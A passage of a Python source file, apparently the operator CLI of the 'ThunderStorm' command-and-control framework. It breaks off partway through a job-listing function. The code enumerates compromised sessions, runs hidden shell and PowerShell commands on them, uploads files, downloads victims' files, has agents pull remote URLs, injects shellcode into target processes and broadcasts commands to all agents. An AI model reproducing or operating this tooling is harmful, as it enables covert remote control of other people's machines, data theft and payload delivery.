#!/usr/bin/python3
# Copyright (C) 2021 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from cmd import Cmd
from sys import argv
from os import getenv
from math import floor
from io import StringIO
from shlex import split
from sched import scheduler
from sys import exit, stderr
from time import time, sleep
from requests import session
from datetime import datetime
from os.path import expandvars
from queue import Queue, Empty
from re import compile, Pattern
from traceback import format_exc
from threading import Event, Thread
from argparse import ArgumentParser
from base64 import b64decode, b64encode
from concurrent.futures import ThreadPoolExecutor
from subprocess import run, CompletedProcess, PIPE, STDOUT


# Unused (not-implemented) options (yet).
"""
  --dex       url       Download the specified URL and attempt to execute it.
                          The result file can be a script to a DLL or binary.
                          It will be saved to a temp dir (unless it's a script
                          or assembly). The type of file can be modified by the
                          value of the "Content-Type" HTTP header.
"""


HELP = """ThunderStorm C2 CLI `Cloud`
Usage: {exe}

Positional Arguments:
  SID                   Session ID to use for actions.

Arguments:
  -h                    Show this help message and exit.
  --help
  -s          url       RPC Server URL. This may be specified in the
  --rpc       url         "$THUNDERSTORM_RPC" environment variable instead.
  -k          url       RPC Server Access Key. This may be specified in the
  --key       key         "$THUNDERSTORM_KEY" environment variable instead.
  --insecure            Ignore SSL certificate errors.

 Enumeration:
  -l                    List all connected Sessions.
  --list
  -L                    List all connected Sessions (more info).
  --list-all
  -x                    List all enabled Listeners.
  --listeners
  -E          regex     Modify list or "--all" output with a regex expression
  --exp       regex       that can match against hostnames.
  -I          regex     Modify list or "--all" output with a regex expression
  --exp-ip    regex      that can match against IP adddresses.
  -O          regex     Modify list or "--all" output with a regex expression
  --exp-os    regex       that can match against OS Names.
  -U          regex     Modify list or "--all" output with a regex expression
  --exp-user  regex       that can match against OS Names.
  -H                    Use hardware IDs instead of the random session IDs.
  --hardware              implies "-l" if omitted. Can be used with all
                          "all" functions to modify results or targets.
                          The env variable "$THUNDERSTORM_HW" may be set to "1"
                          to enable this by default.

 Session Management:
  -j          job       Retrieve results for a specific Job ID.
  --job       job
  -q                    Query info about a connected Session or all
  --info                  Sessions (if using the "--all" flag).
  -Q                    Query info about or all Sessions (same as "-qa").
  --info-all
  -b                    Get a list of Jobs for the Session or all
  --queue                 Sessions (if using the "--all" flag).
  -p                    Remove a connected Session.
  --delete
  -P                    Shutdown and remove a connected Session.
  --shutdown

 Execution:
  -c          cmd       Specify a command to run on the Session.
  --cmd       cmd         See the "COMMAND PREFIXES" section for more info.
  -i                    Enter interactive console mode. This can be
  --interact              the Session ID or an index value prefixed with "@".
  --asm       file      Execute the sellcode in the filepath.
                          This MUST have an execution modifier to be ran.
  --pull      url       Download the specified URL to the location (on the
                          client) specified by the '-f' argument.

 Execution Modifiers:
  -t          secs
  --timeout   secs      Timeout to wait for Job results in seconds.
  -T          filter    Target process for execution attempts.
  --filter    filter      Will take a PID or process name.
  -r                    Don't wait for result of submitted Job and return
  --no-wait               instantly. Job ID may be queried later.
  -m                    Don't block or capture output. Returns instantly.
  --detach
  -z                    Enable the SHOW_WINDOW flag on executed commands.
  --no-hide
  -a                    Run command on all sessions. Applies only to
  --all                   Sessions, Commands and Jobs.

 File Operations:
  -u          file      Upload a server file to this client location.
  --upload    file
  -d          file      Download this client file from this location. Output
  --download  file        defaults to standard output. Use '-f' to modify behavior.
  -f          file      File operation target. output for Download and
  --file      file        input for Upload, DLL or WEB destination (if used).

Command Prefixes:
  Single character prefixes may be used to denote specific command types
  and are interpreted differently by the RPC server. There does not need
  to be a space after the prefix.

  .       Execute the command under the OS-specific shell.
            This is determined by the host during runtime.
  $       Execute the command under PowerShell. This will
            fail if PowerShell is not installed on the host.
  !       Parse the command as a system command. These can be calls
            to change the Sleep/Jitter settings or shutting down
            the agent.
  @       Execute the command under the local host. Only works
            in an interactive session.
"""
HELP_TEXT = """
pwd - Get the current working directory
"""


def _nes(v):
    return isinstance(v, str) and len(v) > 0


def _get_ip(s):
    if "network" not in s["device"]:
        return ""
    for i in s["device"]["network"]:
        if "ip" not in i:
            continue
        for n in i["ip"]:
            if n.startswith("127.0") or ":" in n:
                continue
            return n
    return ""


def _expand(p):
    if not _nes(p):
        return None
    return expandvars(p.replace("~/", "${HOME}/"))


def _filter(f):
    if isinstance(f, Filter):
        return f
    if not _nes(f):
        return None
    v = Filter()
    try:
        v.pid = int(f, 10)
    except ValueError:
        v.include.append(f)
    return v


def _fmt_perm(v):
    if v == 0:
        return "---------"
    b = StringIO()
    if v & (2 ** 31) != 0:
        b.write("d")
    elif v & (2 ** 27) != 0:
        b.write("l")
    elif v & (2 ** 26) != 0:
        b.write("b")
    elif v & (2 ** 25) != 0:
        b.write("p")
    elif v & (2 ** 24) != 0:
        b.write("s")
    elif v & (2 ** 21) != 0:
        b.write("c")
    elif v & (2 ** 19) != 0:
        b.write("I")
    else:
        b.write("-")
    for x in range(8, -1, -1):
        if x % 3 == 2:
            if v & (2 ** x) == 0:
                b.write("-")
            else:
                b.write("r")
            continue
        if x % 3 == 1:
            if v & (2 ** x) == 0:
                b.write("-")
            else:
                b.write("w")
            continue
        if v & (2 ** x) == 0:
            if x == 6 and v & (2 ** 23) != 0:
                if v & (2 ** 31) != 0:
                    b.write("S")
                else:
                    b.write("s")
            elif x == 3 and v & (2 ** 22) != 0:
                if v & (2 ** 31) != 0:
                    b.write("S")
                else:
                    b.write("s")
            elif x == 0 and v & (2 ** 20) != 0:
                b.write("t")
            else:
                b.write("-")
            continue
        if x == 6 and v & (2 ** 23) != 0:
            b.write("S")
        elif x == 3 and v & (2 ** 22) != 0:
            b.write("S")
        elif x == 0 and v & (2 ** 20) != 0:
            b.write("t")
        else:
            b.write("x")
    r = b.getvalue()
    b.close()
    del b
    return r


def _fmt_size(v):
    if v < 1024.0:
        return f"{int(v):3d}"
    v /= 1024.0
    for name in "KMGTPEZ":
        if abs(v) < 1024.0:
            if float(v) == floor(v):
                return f"{int(v):3d}{name}"
            return f"{float(v):3.1f}{name}"
        v /= 1024.0
    return f"{float(v):.1f}Y"


def _split_list(v):
    if not _nes(v):
        return None
    e = list()
    n = 0
    for x in range(0, len(v)):
        if v[x] == " " or v[x] == ",":
            if x - n == 0:
                n = x + 1
                continue
            e.append(v[n:x].strip())
            n = x + 1
    if len(e) == 0:
        e.append(v.strip())
    elif n < len(v):
        e.append(v[n:].strip())
    del n
    return e


def _fmt_time(n, s):
    if len(s) == 0:
        return ""
    v = datetime.fromisoformat(s).replace(tzinfo=None)
    m, n = divmod((n - v).seconds, 60)
    h, m = divmod(m, 60)
    if h > 12:
        return v.strftime("%H:%M")
    del v
    if h > 0:
        return f"{h}h {m}m"
    if m > 0:
        return f"{m}m {n}s"
    return f"{n}s"


def _is_bool_true(v):
    if not _nes(v):
        return False
    return v.strip().lower() in ["1", "t", "true", "yes", "on"]


class Shell(Cmd):
    def __init__(self, rpc, host, timeout):
        Cmd.__init__(self)
        self.rpc = rpc
        self.hide = True
        self.session = host
        self.q = Spinner(rpc)
        self.filter = Filter()
        self.timeout = timeout
        self.prompt = f"{host} > "
        self.q.start()

    def close(self):
        self.q.close()

    def do_ls(self, d):
        if not _nes(d):
            return self.default("!ls")
        self.default(f"!ls {d}")

    def do_cd(self, d):
        if not _nes(d):
            return
        self.default(f"!cd {d}")

    def emptyline(self):
        return None

    def do_pwd(self, _):
        self.default("!pwd")

    def do_job(self, j):
        if not _nes(j):
            return self.do_jobs(None)
        self.rpc.print_result(self.session, j, False, 0, None)

    def do_dex(self, u):
        pass

    def do_web(self, u):
        v = split(u)
        if len(v) != 2 or len(v[0]) == 0 or len(v[1]) == 0:
            return print("[!] web <url> <target dest>")
        try:
            self.q.input.put(
                Action(
                    self.rpc._task_pull(self.session, v[0], v[1]),
                    self.session,
                    self.timeout,
                    cmd=f'pull "{v[0]}" to "{v[1]}',
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err

    def do_run(self, c):
        if not _nes(c):
            return
        if len(c) < 1:
            print("[!] Command must be at least 1 characters!")
        self.default(f".{c}")

    def do_hup(self, c):
        if not _nes(c):
            return
        if len(c) < 1:
            print("[!] Command must be at least 1 characters!")
        try:
            self.rpc._task_execute(self.session, c, self.hide, True, self.filter)
        except ValueError as err:
            print(f"[!] Error: {err}")

    def do_exit(self, _):
        raise KeyboardInterrupt()

    def do_jobs(self, _):
        self.rpc.print_jobs(session=self.session)

    def do_help(self, _):
        print(HELP_TEXT)

    def do_info(self, _):
        self.rpc.print_info(self.session)

    def do_pwsh(self, c):
        if not _nes(c):
            return
        if len(c) < 1:
            print("[!] Command must be at least 1 character!")
        self.default(f"${c}")

    def do_ppid(self, p):
        if not _nes(p):
            self.filter.pid = None
            return
        try:
            v = int(p)
        except ValueError:
            return print(f'[!] "{p}" is not a valid integer!')
        if v <= 0:
            return print("[!] PID must be greater than zero!")
        self.filter.pid = v

    def default(self, c):
        if not _nes(c):
            return
        if len(c) < 1:
            return print("[!] Command must be at least 1 character!")
        try:
            if c[0] == "@":
                o = run(c[1:], shell=True, text=True, stdout=PIPE, stderr=STDOUT)
                if not isinstance(o, CompletedProcess):
                    return
                print(f'Local: "{c[1:]}", Exit Result: {o.returncode}')
                print(o.stdout)
                del o
                return
            self.q.input.put(
                Action(
                    self.rpc._task_execute(
                        self.session, c, self.hide, False, self.filter
                    ),
                    self.session,
                    self.timeout,
                    cmd=c,
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err

    def do_shell(self, c):
        if not _nes(c):
            return
        if len(c) < 1:
            return print("[!] Command must be at least 1 character!")
        self.default(f".{c}")

    def do_pname(self, n):
        self.filter.include = _split_list(n)

    def do_chan(self, en):
        if not _nes(en):
            return self.default("!chan")
        self.default(f"!chan {en}")

    def do_sleep(self, d):
        self.default(f"!sleep {d}")

    def do_jitter(self, p):
        self.default(f"!jitter {p}")

    def do_upload(self, a):
        v = split(a)
        if len(v) != 2 or len(v[0]) == 0 or len(v[1]) == 0:
            return print("[!] upload <local src> <target dest>")
        try:
            self.q.input.put(
                Action(
                    self.rpc._task_upload(self.session, _expand(v[0]), v[1]),
                    self.session,
                    self.timeout,
                    cmd=f'upload "{v[0]}" to "{v[1]}"',
                ),
                block=False,
            )
        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err
        del v

    def do_pclear(self, _):
        self.filter.pid = None
        self.filter.session = None
        self.filter.exclude = None
        self.filter.include = None
        self.filter.fallback = None
        self.filter.elevated = None

    def do_download(self, a):
        v = split(a)
        if len(v) < 1 or len(v) > 2 or len(v[0]) == 0:
            return print("[!] download <target src> [local dest]")
        if len(v) == 1 or len(v[1]) == 0:
            o = None
        else:
            o = _expand(v[1])
        try:
            self.q.input.put(
                Action(
                    self.rpc._task_download(self.session, v[0]),
                    self.session,
                    self.timeout,
                    out=o,
                    cmd=f'download "{v[0]}"',
                ),
                block=False,
            )

        except Exception as err:
            print(f"[!] Error: {err}")
        except KeyboardInterrupt as err:
            raise err
        del o
        del v

    def do_pexclude(self, n):
        self.filter.exclude = _split_list(n)

    def do_phidewin(self, en):
        self.hide = _is_bool_true(en)

    def do_pdesktop(self, en):
        self.filter.session = _is_bool_true(en)

    def do_pfallback(self, en):
        self.filter.fallback = _is_bool_true(en)

    def do_pelevated(self, en):
        self.filter.elevated = _is_bool_true(en)


class RPC(object):
    def __init__(self, url, key=None, insecure=False):
        self.url = url
        self.http = session()
        if isinstance(key, str):
            self.http.headers["X-RestAuth"] = key
        if insecure:
            self.http.verify = False

    def main(self, a):
        m = Matcher(a.match_host, a.match_ip, a.match_os, a.match_user)
        if a.list or a.list_all or (a.list and a.all):
            return self.print_sessions(m, a.list_all or a.all, a.hardware)
        if a.listeners:
            return self.print_listeners()
        if a.jobs:
            return self.print_jobs(a.id, m, a.list_all or a.all, a.hardware)
        if a.info_all or (a.info and a.all):
            return self.print_info(a.id, m, a.hardware)
        if a.all and a.cmd:
            return self.all_do_execute(
                a.cmd,
                a.hide,
                a.detach,
                a.wait,
                a.timeout,
                a.filter,
                m,
                a.hardware,
            )
        if a.all and a.pull:
            return self.all_do_pull(
                a.pull,
                a.file,
                a.wait,
                a.timeout,
                m,
                a.hardware,
            )
        if not _nes(a.id):
            raise ValueError("Target Session ID cannot be empty!")
        if a.job:
            return self.print_result(a.id, a.job, a.wait, a.timeout, a.file)
        if a.info:
            return self.print_info(a.id, None, False)
        if a.delete:
            return self.remove(a.id, a.shutdown)
        if a.interact:
            if a.id[0] != "@":
                return self.shell(a.id, a.timeout)
            v = int(a.id[1:])
            k = self._sessions(None, matcher=m, hw=a.hardware)
            if not isinstance(k, list) or len(k) == 0 or v < 0 or abs(v) > len(k):
                raise ValueError("Invalid Shift Position!")
            s = k[v]["id"]
            del v
            del k
            return self.shell(s, a.timeout)
        if a.cmd:
            return self.do_execute(
                a.id, a.cmd, a.hide, a.detach, a.wait, a.timeout, a.filter
            )
        if a.asm:
            return self.do_assembly(
                a.session, a.file, a.detach, a.wait, a.timeout, a.filter
            )
        if a.download:
            return self.do_download(a.session, a.download, a.wait, a.timeout, a.file)
        if a.upload:
            return self.do_upload(a.session, a.upload, a.file, a.wait, a.timeout)
        if a.pull:
            return self.do_pull(a.session, a.pull, a.file, a.wait, a.timeout)
        raise RuntimeError()

    def _jobs(self, session):
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        r = self.http.get(f"{self.url}/api/v1/session/{session}/job", json=True)
        if r.status_code != 200:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/job" non-200 status code {r.status_code}!'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/job" did not return a dict!'
            )
        return d

    def _print_info(self, session):
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        r = self.http.get(f"{self.url}/api/v1/session/{session}", json=True)
        if r.status_code != 200:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}" non-200 status code {r.status_code}!'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(f'"{self.url}/api/v1/session" did not return a dict!')
        print(
            f'{"ID:":<10}{d["id"]}\n{"="*40}\n{"Hostname:":<10}{d["device"]["hostname"]}\n'
            f'{"User:":<10}{("*" if d["device"]["elevated"] else "") + d["device"]["user"]}\n'
            f'{"OS:":<10}{d["device"]["os"]}\n{"Version:":<10}{d["device"]["version"]}\n'
            f'{"PID:":<10}{d["device"]["pid"]}\n{"PPID:":<10}{d["device"]["ppid"]}\nNetwork:'
        )
        for i in d["device"]["network"]:
            print(f'  {i["name"]+":":6} {", ".join(i["ip"])}')
        t = datetime.now()
        print(
            f'{"Sleep:":<10}{int(int(d["sleep"])//1000000000)}s\n{"Jitter:":<10}{d["jitter"]}%\n'
            f'{"Channel:":<10}{"Yes" if d["channel"] else "No"}\n{"Last:":<10}{_fmt_time(t, d["last"])}',
        )
        if "connector" in d:
            print(f'{"Connector:":<10}{d["connector"]}')
        h = d["device"]["id"][: -len(d["id"])]
        print(
            f'{"Created:":<10}{_fmt_time(t, d["created"])}\n{"From:":<10}{d["via"]}\n{"Hardware:":<10}{h}'
        )
        del h
        del t
        del d

    def _result(self, session, job):
        r = self.http.get(
            f"{self.url}/api/v1/session/{session}/job/{job}/result", json=True
        )
        if r.status_code == 404 or r.status_code == 425:
            return None
        if r.status_code == 204:
            return Result()
        if r.status_code != 200 and r.status_code != 206:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/job/{job}/result" '
                f'non-404/200 status code {r.status_code}! {r.content.decode("UTF-8")}'
            )
        v = r.json()
        r.close()
        if not isinstance(v, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/job/{job}/result" did not return a dict!'
            )
        if r.status_code == 206:
            return Result(None, err=v.get("error", "unknown error"))
        del r
        return Result(data=v)

    def _listeners(self, name=None):
        u = f"{self.url}/api/v1/listener"
        if isinstance(name, str) and len(name) > 0:
            u = f"{u}/{name}"
        r = self.http.get(u, json=True)
        if r.status_code != 200:
            raise RPCError(f'"{u}" non-200 status code {r.status_code}!')
        d = r.json()
        r.close()
        del r
        if isinstance(d, dict):
            return d
        if not isinstance(d, list):
            raise RPCError(f'"{u}" did not return a list!')
        del u
        d.sort(key=lambda x: x["name"], reverse=True)
        return d

    def shell(self, session, timeout):
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        try:
            self._sessions(session=session)
        except Exception as err:
            return print(f"[!] {err.__class__.__name__} {err}", file=stderr)
        s = Shell(self, session, timeout)
        try:
            s.cmdloop(
                'Welcome to the  Bolt  shell. Use "help" to display command guide.\n'
                "Happy hacking!"
            )
        except Exception as err:
            print(f"[!] {err.__class__.__name__} {err}", file=stderr)
        except KeyboardInterrupt:
            print("[+] Closing interactive...")
        s.close()

    def print_listeners(self, name=None):
        n = self._listeners(name)
        if not isinstance(n, list) or len(n) == 0:
            return
        print(f'{"Name":10}{"Bind Address":23}{"# Sessions"}\n{"="*45}')
        for e in n:
            if "type" in e:
                print(f'{e["name"]:10}{e["type"]:23}{len(e["sessions"])}')
            else:
                print(f'{e["name"]:10}{e["address"]:23}{len(e["sessions"])}')
        del n

    @staticmethod
    def _output(r, session, job, out, cmd):
        if r is None:
            return
        if _nes(cmd):
            print(f'[+] Job {session}\\{job} "{cmd}"', end="")
        else:
            print(f"[+] Job {session}\\{job}", end="")
        if r.is_error():
            return print(f" error: {r.error()}")
        if r.type() == "cd":
            return print(" returned")
        elif r.type() == "pwd":
            return print(f" returned: {r.data()}")
        elif r.type() == "list":
            if "entries" not in r:
                print(" returned: 0 entries")
                return True
            e = r["entries"]
            print(f" returned: {len(e)} entries")
            t = datetime.now()
            for i in e:
                v = datetime.fromisoformat(i["modtime"]).replace(tzinfo=None)
                y = None
                if v.year < t.year:
                    y = v.strftime("%Y")
                else:
                    y = v.strftime("%H:%M")
                print(
                    f'{_fmt_perm(i["mode"])} {_fmt_size(i["size"]):>8} '
                    f'{v.strftime("%b"):>3} {v.strftime("%-m"):>2} {y:>5} {i["name"]}'
                )
                del y
                del v
            del t
            return
        elif r.type() == "assembly":
            print(" returned.")
            return print(
                f"[+] PID: {r.pid()}, Handle: {r.handle()}, Exit Result: {r.exit_code()}"
            )
        elif r.type() == "pull" or r.type() == "upload":
            return print(
                f' returned: {_fmt_size(r.get("size", 0))} written to "{r.data()}'
            )
        elif r.type() == "execute" or r.type() is None:
            print(f" returned.\n[+] PID: {r.pid()}, Exit Result: {r.exit_code()}")
            v = r.data()
            if v is None or len(v) == 0:
                return
            return print(v)
        elif r.type() == "download":
            print(
                f' returned: {_fmt_size(r.get("size", 0))} read from "{r.get("path")}"'
            )
            if r.get("dir", False):
                return print("[!] Path is a directory, not downloaded!")
        else:
            print(" completed. [type unknown]")
        v = r.data(True)
        if not isinstance(out, str) or len(out) == 0:
            return print(v.decode("UTF-8"))
        with open(out, "wb") as f:
            f.write(v)
            f.flush()
        print(f'Saved to "{out}".')
        del v

    def _task_download(self, session, file):
        if not _nes(file):
            raise ValueError("File path cannot be empty!")
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        r = self.http.put(
            f"{self.url}/api/v1/session/{session}/download",
            json={"path": file},
        )
        if r.status_code != 201:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/download" non-201 status code {r.status_code}!'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/download" did not return a dict!'
            )
        if "id" not in d:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/download" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[+] {session}: Submitted Job ID is {j}.")
        return j

    def _task_pull(self, session, url, file):
        if not _nes(url):
            raise ValueError("URL cannot be empty!")
        if not _nes(file):
            raise ValueError("File path cannot be empty!")
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        r = self.http.put(
            f"{self.url}/api/v1/session/{session}/pull",
            json={"path": file, "data": url},
        )
        if r.status_code != 201:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/pull" non-201 status code {r.status_code}!'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/pull" did not return a dict!'
            )
        if "id" not in d:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/pull" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[+] {session}: Submitted Job ID is {j}.")
        return j

    def remove(self, session, shutdown=False):
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        r = self.http.delete(
            f"{self.url}/api/v1/session/{session}", json={"shutdown": shutdown}
        )
        r.close()
        if r.status_code != 200:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}" non-200 status code {r.status_code}!'
            )
        del r

    def _process(self, session, job, out, cmd):
        r = self._result(session, job)
        if not isinstance(r, Result):
            return False
        RPC._output(r, session, job, out, cmd)
        return True

    def _print_jobs(self, session, prefix=False):
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        d = self._jobs(session)
        if not isinstance(d, dict) and len(d) > 0:
            return
        if not prefix:
            print(
                f'{"ID":6}{"Type":5}{"Status":11}{"Start":10}{"Complete":10}{"Result"}\n{"="*50}'
            )
        t = datetime.now()
        e = list(d.values())
        del d
        e.sort(key=lambda x: x["start"], reverse=True)
        for j in e:
            if "id" not in j or "status" not in j or "type" not in j:
                continue
            if prefix:
                print(f'{j["host"]} ', end="")
            print(
                f'{j["id"]:<6}{j["type"]:<5}{j["status"].title():11}{_fmt_time(t, j["start"]):10}',
                end="",
            )
            if "complete" in j:
                print(f'{_fmt_time(t, j["complete"]):10}', end="")
            if "result" in j and isinstance(j["result"], int) and j["result"] > 0:
                print(f'{j["result"]}b', end="")
            if "error" in j and len("error") > 0:
                print(j["error"], end="")
            print()
        del t
        del e

    def _task_upload(self, session, source, dest):
        if not _nes(dest):
            raise ValueError("File destination path cannot be empty!")
        if not _nes(source):
            raise ValueError("File source path cannot be empty!")
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        with open(source, "rb") as f:
            b = b64encode(f.read()).decode("UTF-8")
        r = self.http.put(
            f"{self.url}/api/v1/session/{session}/upload",
            json={"path": dest, "data": b},
        )
        del b
        if r.status_code != 201:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/upload" non-201 status code {r.status_code}!'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/upload" did not return a dict!'
            )
        if "id" not in d:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/upload" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[+] {session}: Submitted Job ID is {j}.")
        return j

    def _spin(self, session, job, timeout, cmd, out):
        t = scheduler(timefunc=time, delayfunc=sleep)
        e = Event()
        h = t.enter(timeout, 1, e.set)
        print(f"[*] Waiting {timeout} seconds for results...")
        try:
            while not e.is_set():
                if self._process(session, job, out, cmd):
                    break
                sleep(1)
                t.run(False)
        except KeyboardInterrupt:
            pass
        try:
            t.cancel(h)
        except ValueError:
            pass
        e.set()
        del h
        del e
        del t

    def do_pull(self, session, url, dest, wait, timeout):
        j = self._task_pull(session, url, dest)
        if not wait:
            return
        self._spin(session, j, timeout, f'pull "{url}" to "{dest}"', None)
        del j

    def _task_assembly(self, session, file, detach, filter):
        if not _nes(file):
            raise ValueError("File path cannot be empty!")
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        if not isinstance(filter, Filter):
            raise ValueError("Filter must be specified for Assembly!")
        v = filter.json()
        if len(v) == 0:
            raise ValueError("Non-empty Filter must be specified for Assembly!")
        with open(file, "rb") as f:
            b = b64encode(f.read()).decode("UTF-8")
        p = {"data": b, "wait": not detach, "filter": v}
        del v
        del b
        r = self.http.put(f"{self.url}/api/v1/session/{session}/assembly", json=p)
        del p
        if r.status_code != 201:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/assembly" non-201 status code '
                f'{r.status_code}! {r.content.decode("UTF-8")}'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/assembly" did not return a dict!'
            )
        if "id" not in d:
            raise RPCError(
                f'"{self.url}/api/v1/session/{session}/assembly" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[+] {session}: Submitted Job ID is {j}.")
        return j

    def print_result(self, session, job, wait, timeout, out):
        if self._process(session, job, out, None):
            return
        if not wait:
            return
        self._spin(session, job, timeout, None, out)

    def do_upload(self, session, source, dest, wait, timeout):
        j = self._task_upload(session, _expand(source), _expand(dest))
        if not wait:
            return
        self._spin(session, j, timeout, f'upload "{source}" to "{dest}"', None)
        del j

    def _sessions(self, session=None, matcher=None, hw=False):
        u = f"{self.url}/api/v1/session"
        if _nes(session):
            u = f"{u}/{session}"
        r = self.http.get(u, json=True)
        if r.status_code != 200:
            raise RPCError(f'"{u}" non-200 status code {r.status_code}!')
        d = r.json()
        r.close()
        del r
        if isinstance(d, dict):
            return d
        if not isinstance(d, list):
            raise RPCError(f'"{u}" did not return a list!')
        del u
        if hw:
            d.sort(key=lambda x: x["device"]["id"], reverse=True)
        else:
            d.sort(key=lambda x: x["id"], reverse=True)
        if isinstance(matcher, Matcher):
            return matcher.matches(d)
        return d

    def print_info(self, session=None, matcher=None, hw=False):
        if _nes(session):
            return self._print_info(session)
        e = self._sessions(matcher=matcher, hw=hw)
        for s in e:
            self._print_info(s["id"])
            print()
        del e

    def do_download(self, session, target, wait, timeout, out):
        j = self._task_download(session, target)
        if not wait:
            return
        self._spin(session, j, timeout, f'download "{target}"', _expand(out))
        del j

    def _task_execute(self, session, cmd, hide, detach, filter):
        if not _nes(cmd):
            raise ValueError("Command cannot be empty!")
        if not _nes(session):
            raise ValueError("Target Session ID cannot be empty!")
        p = {"data": cmd, "wait": not detach, "hide": hide}
        if isinstance(filter, Filter):
            d = filter.json()
            if len(d) > 0:
                p["filter"] = d
            del d
        r = self.http.put(f"{self.url}/api/v1/session/{session}/cmd", json=p)
        del p
        if r.status_code == 200 and cmd[0] == "!":
            print(f"[+] {session}: Ok!")
            return None
        if r.status_code != 201:
            raise ValueError(
                f'"{self.url}/api/v1/session/{session}/cmd" non-201 status code '
                f'{r.status_code}! {r.content.decode("UTF-8")}'
            )
        d = r.json()
        r.close()
        del r
        if not isinstance(d, dict):
            raise ValueError(
                f'"{self.url}/api/v1/session/{session}/cmd" did not return a dict!'
            )
        if "id" not in d:
            raise ValueError(
                f'"{self.url}/api/v1/session/{session}/cmd" did not return a Job ID!'
            )
        j = d["id"]
        del d
        print(f"[+] {session}: Submitted Job ID is {j}.")
        return j

    def all_do_pull(self, url, dest, wait, timeout, matcher, hw):
        e = self._sessions(matcher=matcher, hw=hw)
        s = Spinner(self)
        s.start()
        f = _filter(filter)
        for x in e:
            j = self._task_pull(x["id"], url, dest)
            if not wait:
                continue
            s.input.put(
                Action(j, x["id"], timeout, cmd=f'pull "{url}" to "{dest}"'),
                block=False,
            )
            del j
        del e
        del f
        try:
            while not s.input.empty():
                sleep(1)
            # Using "cancel_futures" as a named arg fucks with PyRight.
            s.ex.shutdown(wait=True, **{"cancel_futures": False})
        except KeyboardInterrupt:
            pass
        s.close()
        del s

    def print_sessions(self, matcher=None, expanded=False, hw=False):
        e = self._sessions(matcher=matcher, hw=hw)
        if not isinstance(e, list) or len(e) == 0:
            return
        t = datetime.now()
        m = 0
        if hw:
            print(f'{"ID":25}', end="")
            m = 16
        else:
            print(f'{"ID":9}', end="")
        if expanded:
            print(
                f'{"Hostname":20}{"IP":17}{"OS":20}{"User":31}{"From":21}{"PID":9}{" Last":8}\n{"="*(140+m)}'
            )
        else:
            print(
                f'{"Hostname":20}{"IP":17}{"OS":10} {"User":31}{"PID":9}{" Last":8}\n{"="*(105+m)}'
            )
        del m
        for s in e:
            if expanded:
                v = s["via"].split(":")
                if "connector" in s and len(v) > 0:
                    if "/" in s["connector"]:
                        v = s["connector"].split("/")[0] + "|" + v[0]
                    else:
                        v = s["connector"] + "|" + v[0]
                o = s["device"]["version"].split("(")
                if len(o) > 20:
                    o[0] = o[0][:20]
                if hw:
                    print(f'{s["device"]["id"][:16]+ s["id"]:25}', end="")
                else:
                    print(f'{s["id"]:9}', end="")
                print(
                    f'{s["device"]["hostname"]:20}{_get_ip(s):17}{o[0]:19}'
                    f'{("*" if s["device"]["elevated"] else " ") + s["device"]["user"]:32}{v:21}'
                    f'{s["device"]["pid"]:<9}{"C" if s["channel"] else " "}{_fmt_time(t, s["last"])}'
                )
                del v
                del o
                continue
            if hw:
                print(f'{s["device"]["id"][:16]+ s["id"]:25}', end="")
            else:
                print(f'{s["id"]:9}', end="")
            print(
                f'{s["device"]["hostname"]:20}{_get_ip(s):17}{s["device"]["os"]:10}'
                f'{("*" if s["device"]["elevated"] else " ") + s["device"]["user"]:32}{s["device"]["pid"]:<9}'
                f'{"C" if s["channel"] else " "}{_fmt_time(t, s["last"])}'
            )
        del t
        del e

    def print_jobs(self, session=None, matcher=None, all=False, hw=False):
        if not all:
            if not _nes(session):
                raise ValueError("Target Session ID cannot be empty!")
            return self._print_jobs(session, False)
        e = self._sessions(matcher=matcher, hw=hw)
